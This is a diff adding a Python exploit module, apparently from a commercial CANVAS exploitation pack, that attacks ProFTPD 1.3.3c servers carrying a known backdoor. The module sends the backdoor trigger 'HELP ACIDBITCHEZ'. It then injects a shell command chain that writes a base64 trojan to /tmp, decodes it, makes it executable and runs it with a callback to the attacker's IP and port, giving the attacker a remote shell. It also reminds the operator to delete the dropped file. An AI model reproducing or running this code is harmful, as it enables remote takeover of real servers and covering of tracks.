@@ -1,0 +1,111 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2011
+#
+
+import os, sys, string, base64
+
+sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from libs.canvasos import *
+
+import canvasengine
+
+
+NAME = 'd2sec_proftpd_bdoor'
+DESCRIPTION = 'Exploits a backdoor that was added to the ProFTPD download archive (1.3.3c) and run a Mosdef trojan.' 
+
+VERSION='0.1'
+
+DOCUMENTATION = {}
+DOCUMENTATION['VENDOR'] = 'ProFTPD'
+DOCUMENTATION["Repeatability"] = 'Infinite'
+DOCUMENTATION['Date public'] = '2010/12/02'
+DOCUMENTATION['References'] = 'http://www.securityfocus.com/bid/45150'
+DOCUMENTATION['Versions Affected'] = '1.3.3c'
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = ""
+DOCUMENTATION["CVE Url"] = ""
+DOCUMENTATION["Notes"] = ""
+
+PROPERTY = {}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Remote'
+PROPERTY['ARCH'] = [ ['Linux'] ]
+
+class theexploit(tcpexploit):
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.name = NAME
+    self.host = ''
+    self.port = 21
+    self.platform = 'Linux'
+    self.arch = 'X86'
+
+  def getargs(self):
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get('port', self.port))
+
+  def neededListenerTypes(self):
+    import canvasengine
+    return [canvasengine.UNIVERSAL_MOSDEF]
+
+  def maketrojan(self):
+    from libs.canvasos import canvasos
+    my_os = canvasos(self.platform)
+    my_os.arch = self.arch
+    self.log("Creating a callback to %s:%s"%(self.callback.ip, self.callback.port))
+    if not self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os=my_os, universal=True):
+      return ''
+    base64data = base64.encodestring(self.mosdeftrojan)
+    return base64data
+
+  def run(self):
+    self.getargs()
+    self.setInfo('[D2] %s attacking %s:%d (in progress)' % (NAME, self.host, self.port))
+    self.log('[D2] Attacking %s:%d' % (self.host, self.port))
+    nfo = ''
+    s = self.gettcpsock()
+    s.set_timeout(10)
+    s.connect((self.host, self.port))
+    nfo = s.recv(1024)
+    if 'proftp' not in nfo.lower():
+      self.log('[D2] FTP server is not a ProFTPD server')
+      self.setInfo('[D2] %s attacking %s:%d (failed!)' % (NAME, self.host, self.port))
+      return 0
+    self.log('%s' % nfo)
+    s.send('HELP ACIDBITCHEZ\r\n')
+    nfo = ''
+    try:
+      nfo = s.recv(1024)
+    except Exception, e:
+      pass
+    if nfo and '502' in nfo:
+      self.log('[D2] ProFTPD server is not backdoored')
+      self.setInfo('[D2] %s attacking %s:%d (failed!)' % (NAME, self.host, self.port))
+      return 0
+    trojan = self.maketrojan()
+    if not trojan:
+      self.setInfo('[D2] %s attacking %s:%d (failed!)' % (NAME, self.host, self.port))
+      return 0
+    s.send('echo "%s" > /tmp/s && echo "import base64;n = open(\'/tmp/s\', \'r\').read();open(\'/tmp/d\', \'w\').write(base64.b64decode(n))" > /tmp/p && python /tmp/p && rm /tmp/s /tmp/p && chmod +x /tmp/d && /tmp/d %s %s' % (trojan, self.callback.ip, self.callback.port))
+    s.close()
+    self.log('[D2] Don\'t forget to delete /tmp/d')
+    self.setInfo('[D2] %s attacking %s:%d (succeeded!)' % (NAME, self.host, self.port))
+    self.log('[D2] %s done (succeeded!)' % NAME)
+    return 1
+
+  def usage(self):
+    print 'Usage: %s -t host -p port -l localip -d localport' % sys.argv[0]
+    sys.exit(0)
+
+if __name__=='__main__':
+  print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
